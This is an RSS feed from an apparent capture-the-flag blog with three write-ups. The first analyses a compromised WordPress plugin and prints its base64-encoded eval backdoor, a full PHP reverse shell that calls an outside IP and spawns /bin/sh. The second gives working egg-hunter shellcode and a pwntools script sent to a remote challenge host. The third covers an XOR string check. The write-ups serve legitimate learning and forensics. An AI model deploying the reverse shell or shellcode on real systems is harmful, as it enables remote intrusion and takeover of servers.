<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>writeup on 0xlilith</title>
    <link>/tags/writeup/</link>
    <description>Recent content in writeup on 0xlilith</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 05 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="/tags/writeup/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Fake News Writeup</title>
      <link>/posts/fake-news/</link>
      <pubDate>Mon, 05 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>/posts/fake-news/</guid>
      <description>Fake News Writeup - HTB University 2022 - CTF</description>
      <content:encoded><![CDATA[<h2 id="description">Description</h2>
<p><img loading="lazy" src="/images/fake-news/fake-news-description.png" type="" alt=""  />
As the description says the site Magic informer was compromised by a hacker group &ldquo;Dark Pointy Hats&rdquo; from
leaked credentials and used the site to host a phishing campaign.<br>
We are provided with the root folder of the Magic informer site where we have to analyze the breach. So we begin with checking the content of the root folder.</p>
<h2 id="hunting-the-hunter">Hunting The Hunter</h2>
<p><img loading="lazy" src="/images/fake-news/root-folder.png" type="" alt=""  />
We can already see the contents and get an idea that Wordpress is being used as the CMS.
Wordpress can be compromised in many ways through some core vulnerability, vulnerable plugins, themes etc.
But after some enumerations I found that the version of this wordpress was not vulnerable and neither was any themes that was used which leaves us with plugins.
<img loading="lazy" src="/images/fake-news/pluggins.png" type="" alt=""  />
Upon going through all three plugins, I found that the <code>plugin-manager.php</code> had a wried eval code that decodes some base64 encoding.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="s2">&#34;c2V0X3RpbWVfbGltaXQgKDApOwokVkVSU0lPTiA9ICIxLjAiOwokaXAgPSAnNzcuNzQuMTk4LjUyJzsgIC8vIENIQU5HRSBUSElTCiRwb3J0ID0gNDQ0NDsgICAgICAgLy8gQ0hBTkdFIFRISVMKJGNodW5rX3NpemUgPSAxNDAwOwokd3JpdGVfYSA9IG51bGw7CiRlcnJvcl9hID0gbnVsbDsKJHBhcnQxID0gIkhUQntDMG0zXzBuIjsKJHNoZWxsID0gJ3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSc7CiRkYWVtb24gPSAwOwokZGVidWcgPSAwOwoKLy8KLy8gRGFlbW9uaXNlIG91cnNlbGYgaWYgcG9zc2libGUgdG8gYXZvaWQgem9tYmllcyBsYXRlcgovLwoKLy8gcGNudGxfZm9yayBpcyBoYXJkbHkgZXZlciBhdmFpbGFibGUsIGJ1dCB3aWxsIGFsbG93IHVzIHRvIGRhZW1vbmlzZQovLyBvdXIgcGhwIHByb2Nlc3MgYW5kIGF2b2lkIHpvbWJpZXMuICBXb3J0aCBhIHRyeS4uLgppZiAoZnVuY3Rpb25fZXhpc3RzKCdwY250bF9mb3JrJykpIHsKCS8vIEZvcmsgYW5kIGhhdmUgdGhlIHBhcmVudCBwcm9jZXNzIGV4aXQKCSRwaWQgPSBwY250bF9mb3JrKCk7CgkKCWlmICgkcGlkID09IC0xKSB7CgkJcHJpbnRpdCgiRVJST1I6IENhbid0IGZvcmsiKTsKCQlleGl0KDEpOwoJfQoJCglpZiAoJHBpZCkgewoJCWV4aXQoMCk7ICAvLyBQYXJlbnQgZXhpdHMKCX0KCgkvLyBNYWtlIHRoZSBjdXJyZW50IHByb2Nlc3MgYSBzZXNzaW9uIGxlYWRlcgoJLy8gV2lsbCBvbmx5IHN1Y2NlZWQgaWYgd2UgZm9ya2VkCglpZiAocG9zaXhfc2V0c2lkKCkgPT0gLTEpIHsKCQlwcmludGl0KCJFcnJvcjogQ2FuJ3Qgc2V0c2lkKCkiKTsKCQlleGl0KDEpOwoJfQoKCSRkYWVtb24gPSAxOwp9IGVsc2UgewoJcHJpbnRpdCgiV0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwuIik7Cn0KCi8vIENoYW5nZSB0byBhIHNhZmUgZGlyZWN0b3J5CmNoZGlyKCIvIik7CgovLyBSZW1vdmUgYW55IHVtYXNrIHdlIGluaGVyaXRlZAp1bWFzaygwKTsKCi8vCi8vIERvIHRoZSByZXZlcnNlIHNoZWxsLi4uCi8vCgovLyBPcGVuIHJldmVyc2UgY29ubmVjdGlvbgokc29jayA9IGZzb2Nrb3BlbigkaXAsICRwb3J0LCAkZXJybm8sICRlcnJzdHIsIDMwKTsKaWYgKCEkc29jaykgewoJcHJpbnRpdCgiJGVycnN0ciAoJGVycm5vKSIpOwoJZXhpdCgxKTsKfQoKLy8gU3Bhd24gc2hlbGwgcHJvY2VzcwokZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgKICAgMCA9PiBhcnJheSgicGlwZSIsICJyIiksICAvLyBzdGRpbiBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCByZWFkIGZyb20KICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksICAvLyBzdGRvdXQgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KICAgMiA9PiBhcnJheSgicGlwZSIsICJ3IikgICAvLyBzdGRlcnIgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KKTsKCiRwcm9jZXNzID0gcHJvY19vcGVuKCRzaGVsbCwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpOwoKaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKCXByaW50aXQoIkVSUk9SOiBDYW4ndCBzcGF3biBzaGVsbCIpOwoJZXhpdCgxKTsKfQoKLy8gU2V0IGV2ZXJ5dGhpbmcgdG8gbm9uLWJsb2NraW5nCi8vIFJlYXNvbjogT2Njc2lvbmFsbHkgcmVhZHMgd2lsbCBibG9jaywgZXZlbiB0aG91Z2ggc3RyZWFtX3NlbGVjdCB0ZWxscyB1cyB0aGV5IHdvbid0CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzBdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMV0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHNvY2ssIDApOwoKcHJpbnRpdCgiU3VjY2Vzc2Z1bGx5IG9wZW5lZCByZXZlcnNlIHNoZWxsIHRvICRpcDokcG9ydCIpOwoKd2hpbGUgKDEpIHsKCS8vIENoZWNrIGZvciBlbmQgb2YgVENQIGNvbm5lY3Rpb24KCWlmIChmZW9mKCRzb2NrKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBjb25uZWN0aW9uIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkvLyBDaGVjayBmb3IgZW5kIG9mIFNURE9VVAoJaWYgKGZlb2YoJHBpcGVzWzFdKSkgewoJCXByaW50aXQoIkVSUk9SOiBTaGVsbCBwcm9jZXNzIHRlcm1pbmF0ZWQiKTsKCQlicmVhazsKCX0KCgkvLyBXYWl0IHVudGlsIGEgY29tbWFuZCBpcyBlbmQgZG93biAkc29jaywgb3Igc29tZQoJLy8gY29tbWFuZCBvdXRwdXQgaXMgYXZhaWxhYmxlIG9uIFNURE9VVCBvciBTVERFUlIKCSRyZWFkX2EgPSBhcnJheSgkc29jaywgJHBpcGVzWzFdLCAkcGlwZXNbMl0pOwoJJG51bV9jaGFuZ2VkX3NvY2tldHMgPSBzdHJlYW1fc2VsZWN0KCRyZWFkX2EsICR3cml0ZV9hLCAkZXJyb3JfYSwgbnVsbCk7CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgVENQIHNvY2tldCwgc2VuZAoJLy8gZGF0YSB0byBwcm9jZXNzJ3MgU1RESU4KCWlmIChpbl9hcnJheSgkc29jaywgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkc29jaywgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0s6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkcGlwZXNbMF0sICRpbnB1dCk7Cgl9CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgcHJvY2VzcydzIFNURE9VVAoJLy8gc2VuZCBkYXRhIGRvd24gdGNwIGNvbm5lY3Rpb24KCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KCgkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBwcm9jZXNzJ3MgU1RERVJSCgkvLyBzZW5kIGRhdGEgZG93biB0Y3AgY29ubmVjdGlvbgoJaWYgKGluX2FycmF5KCRwaXBlc1syXSwgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlIgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1syXSwgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUjogJGlucHV0Iik7CgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJfQp9CgpmY2xvc2UoJHNvY2spOwpmY2xvc2UoJHBpcGVzWzBdKTsKZmNsb3NlKCRwaXBlc1sxXSk7CmZjbG9zZSgkcGlwZXNbMl0pOwpwcm9jX2Nsb3NlKCRwcm9jZXNzKTsKCi8vIExpa2UgcHJpbnQsIGJ1dCBkb2VzIG5vdGhpbmcgaWYgd2UndmUgZGFlbW9uaXNlZCBvdXJzZWxmCi8vIChJIGNhbid0IGZpZ3VyZSBvdXQgaG93IHRvIHJlZGlyZWN0IFNURE9VVCBsaWtlIGEgcHJvcGVyIGRhZW1vbikKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewoJaWYgKCEkZGFlbW9uKSB7CgkJcHJpbnQgIiRzdHJpbmdcbiI7Cgl9Cn0=&#34;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>After decodin it I found my first flag <code>HTB{C0m3_0n</code> also this plugin was being used to spwan a reverse shell to the server.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set_time_limit (0);
</span></span><span class="line"><span class="cl">$VERSION = &#34;1.0&#34;;
</span></span><span class="line"><span class="cl">$ip = &#39;77.74.198.52&#39;;  // CHANGE THIS
</span></span><span class="line"><span class="cl">$port = 4444;       // CHANGE THIS
</span></span><span class="line"><span class="cl">$chunk_size = 1400;
</span></span><span class="line"><span class="cl">$write_a = null;
</span></span><span class="line"><span class="cl">$error_a = null;
</span></span><span class="line"><span class="cl">$part1 = &#34;HTB{C0m3_0n&#34;;
</span></span><span class="line"><span class="cl">$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
</span></span><span class="line"><span class="cl">$daemon = 0;
</span></span><span class="line"><span class="cl">$debug = 0;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="in-search-of-flag-part2">In Search of Flag: part2</h2>
<p>After going through the root files one more time I found some weird obfuscated JS code in the <code>wp-blog/2022/11/index.php</code> which I spent alot of my time dobfuscating it just to find nothing. But I just wanted to see the working of that code so I hosted the blog and voila! we were provided with a download of <code>official_invitation.iso</code> file.</p>
<p>I got an <code>official_invitation.exe</code> after checking the mount, which upon clicking showed me some interesting hidden files.
<img loading="lazy" src="/images/fake-news/mounting.png" type="" alt=""  />
<img loading="lazy" src="/images/fake-news/hidden-files.png" type="" alt=""  />
And after analyzing and reading some strings we got our second part of the flag <code>_1t_w4s_t00_g00d_t0_b3_tru3}</code>
<img loading="lazy" src="/images/fake-news/flag-part-2.png" type="" alt=""  /></p>
<p>Flag : <code>HTB{C0m3_0n_1t_w4s_t00_g00d_t0_b3_tru3}</code></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HTB Hunting Writeup</title>
      <link>/posts/htb-hunting-writeup/</link>
      <pubDate>Mon, 05 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>/posts/htb-hunting-writeup/</guid>
      <description>Hunting in the lower realms</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="/images/htb-hunting/description.png" type="" alt=""  /></p>
<h3 id="analyzing-the-binary">Analyzing the binary</h3>
<p><img loading="lazy" src="/images/htb-hunting/analyze.png" type="" alt=""  />
The binary haults for the input and crashes as we pass something.
<img loading="lazy" src="/images/htb-hunting/strings-output.png" type="" alt=""  />
Upon reading the stings we found a string which looks like a dummy file. Time to look for it in IDA pro.</p>
<h3 id="ida">IDA</h3>
<blockquote>
<p>i changed some of the variable names for better understanding</p>
</blockquote>
<p>I jumped to the variable to see where it was being used and after reading the code we see that that string was being moved from one location to another.
<img loading="lazy" src="/images/htb-hunting/img1.png" type="" alt=""  />
It first sets a new location and copies the flag to that location then empty&rsquo;s flag value from the previous location.
<img loading="lazy" src="/images/htb-hunting/img2.png" type="" alt=""  />
It also creates an exit signal and triggers it with a timer of 10 seconds. Which means that program will exit after 10 seconds.
<img loading="lazy" src="/images/htb-hunting/img3.png" type="" alt=""  /></p>
<blockquote>
<p>I am literally reversing it from down to top</p>
</blockquote>
<p>Before the singnal code, it calls a function which returns a randomly generated number.
<img loading="lazy" src="/images/htb-hunting/img4.png" type="" alt=""  />
Further reading the code we now know that it generates a number from a range of <code>0x5FFFFFFF</code> &lt; i &lt;= <code>0xF7000000</code>
which is a randomly generated address.
Then it takes to a buffer size of <code>60</code> and executes it as a shellcode. (reason why the segfault)</p>
<p>So overall the program moves the flag to a random address location, kills the program after 10 seconds, reads our input and executes it as a shellcode.</p>
<blockquote>
<p>NOTE: Since the buffer size is limited. We have to be very creative and minimal while crafting our payload.</p>
</blockquote>
<h3 id="planning-our-exploit">Planning our exploit</h3>
<p>Since the program kills itself after 10 seconds we will set up a timer with much higher value. Then we will traverse through addresses from a range of <code>0x5FFFFFFF</code>searching for the flag and send it to stdout if it matches.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">section</span> <span class="no">.text</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">global</span> <span class="no">_start</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">_start:</span>
</span></span><span class="line"><span class="cl">  <span class="c1">; Set a timer to send a SIGALRM signal after 120 seconds.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">push</span> <span class="mi">120</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pop</span> <span class="no">ebx</span>
</span></span><span class="line"><span class="cl">  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x1b</span>
</span></span><span class="line"><span class="cl">  <span class="nf">int</span> <span class="mi">0x80</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">; Set the starting address for the search.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x7b425448</span> <span class="c1">; &#34;{BTH&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0x5fffffff</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">next_page:</span>
</span></span><span class="line"><span class="cl">  <span class="c1">; Set the last byte address on the page.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">or</span> <span class="no">dx</span><span class="p">,</span> <span class="mi">0xfff</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">; Move to the next page.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">add</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">4096</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nl">next_address:</span>
</span></span><span class="line"><span class="cl">  <span class="c1">; Move to the next address on the page.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">inc</span> <span class="no">edx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">; Check if the current address is valid.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">push</span> <span class="no">edx</span>
</span></span><span class="line"><span class="cl">  <span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
</span></span><span class="line"><span class="cl">  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x21</span>
</span></span><span class="line"><span class="cl">  <span class="nf">int</span> <span class="mi">0x80</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pop</span> <span class="no">edx</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">; If the address is not valid, go to the next page.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">cmp</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0xf2</span>
</span></span><span class="line"><span class="cl">  <span class="nf">jz</span> <span class="no">next_page</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">; Check if the value at the current address is the flag.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">cmp</span> <span class="no">dword</span> <span class="p">[</span><span class="no">edx</span><span class="p">],</span> <span class="no">edi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">; If the value matches, then stdout
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">jnz</span> <span class="no">next_address</span>
</span></span><span class="line"><span class="cl">  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">edx</span>
</span></span><span class="line"><span class="cl">  <span class="nf">push</span> <span class="mi">36</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pop</span> <span class="no">edx</span>
</span></span><span class="line"><span class="cl">  <span class="nf">push</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pop</span> <span class="no">ebx</span>
</span></span><span class="line"><span class="cl">  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x4</span>
</span></span><span class="line"><span class="cl">  <span class="nf">int</span> <span class="mi">0x80</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">; Exit the program.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ret</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn-time">Pwn Time</h3>
<p>First we craft our payload into bytecodes and send it through pwntools
<img loading="lazy" src="/images/htb-hunting/img7.png" type="" alt=""  /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x6a\x3c\x5b\x6a\x1b\x58\xcd\x80\xbf\x48\x54\x42\x7b\xba\xff\xff\xff\x5f\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xeb\x39\x3a\x75\xec\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\xb0\x04\xcd\x80</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#r = process(&#34;./hunting&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;134.209.22.121&#34;</span><span class="p">,</span> <span class="mi">31067</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/images/htb-hunting/img8.png" type="" alt=""  /></p>
<p>Flag: <code>HTB{H0w_0n_34rth_d1d_y0u_f1nd_m3?!?}</code></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HeapOverride Senpai&#39;s Castle</title>
      <link>/posts/heapoverride-senpais-castle/</link>
      <pubDate>Sat, 07 Aug 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/heapoverride-senpais-castle/</guid>
      <description>Lilith Struggling with heap senpai&amp;#39;s binary</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="/images/img1.png" type="" alt=""  /></p>
<p>hmmm smol pp moment ! now we go open it in a disassembler</p>
<p><img loading="lazy" src="/images/img2.png" type="" alt=""  /></p>
<p>lets read the main function!
first it does its regular job of loading the stack and moving argc and argv to the registers
then it checks weither the value of argc is == 2 as it takes one 1 argument vector shown in img1.
If it fails the condition then it jumps to the address 0x11bd. less have a look at it.</p>
<p><img loading="lazy" src="/images/img3.png" type="" alt=""  /></p>
<p>brrr&hellip;.as we can see it just prints out the string &ldquo;Umm&hellip;no&hellip;&rdquo;
now lets see what happens if it matches the condition i.e if we pass something in the argument vector.</p>
<p><img loading="lazy" src="/images/img4.png" type="" alt=""  /></p>
<p>okkkkkkkk wait i am feeling cold&hellip; i am back. Back to the whatever we are doing. We can see that the string
that we entered is being passed to a function call fun.00011dc. Now lets see what that function does to our
baby stringwqnwdn. uhhghhghg my string ;-;-;-;!!</p>
<p><img loading="lazy" src="/images/img5.png" type="" alt=""  /></p>
<p>brrrr this shit is too confusing lets decompile it else ill die trying
you dont want me to die right?&hellip;.right? do you want me to die do you want me to DIE???
ok</p>
<p><img loading="lazy" src="/images/img6.png" type="" alt=""  /></p>
<p>much better but we still need to do some cleanups&hellip;wait here
I just changed the variable names to something readable brrr wtf is uVar3 and var4h._4_4</p>
<p><img loading="lazy" src="/images/img7.png" type="" alt=""  /></p>
<p>before we do anything else lets first see what that 0x4050 holds for us.
shshbh &ldquo;FZGSVdzohWNAAGSCW^z_HMf]THbJWUnT_URK&rdquo; som crazy string.
They are first comparing the length of that crazy string to the length of our baby string.
And if the condition matches we enter inside the loop.</p>
<p>lets make it moe simple [note: asuming crazy = 0x4050]</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">13</span>  <span class="n">j</span> <span class="o">=</span> <span class="n">crazy_string_len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">14</span>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">crazy_string_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl"><span class="mi">15</span>    <span class="k">if</span> <span class="p">(</span><span class="n">crazy</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">j</span> <span class="o">^</span> <span class="mi">55</span> <span class="p">)</span> <span class="o">!=</span> 
</span></span><span class="line"><span class="cl"><span class="mi">16</span>      <span class="n">arg1</span><span class="p">[</span><span class="n">i</span><span class="p">]){</span> <span class="c1">// this next line is on purpose cus i am trying to replicate the code line by line
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">17</span>      <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">18</span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mi">19</span>    <span class="n">j</span><span class="o">--</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">20</span>  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>j stores the length of that crazy string. Then inside the for loop we have an if with some condition.
char at index i of crazy xor j xor 55 is != char at index i of our baby string.
waaaaaaw now we know whats actually happening inside the hood. We can just write a script to solve it</p>
<p><img loading="lazy" src="/images/img8.png" type="" alt=""  /></p>
<p>hmmm BIG pp moment !! we got the flag</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
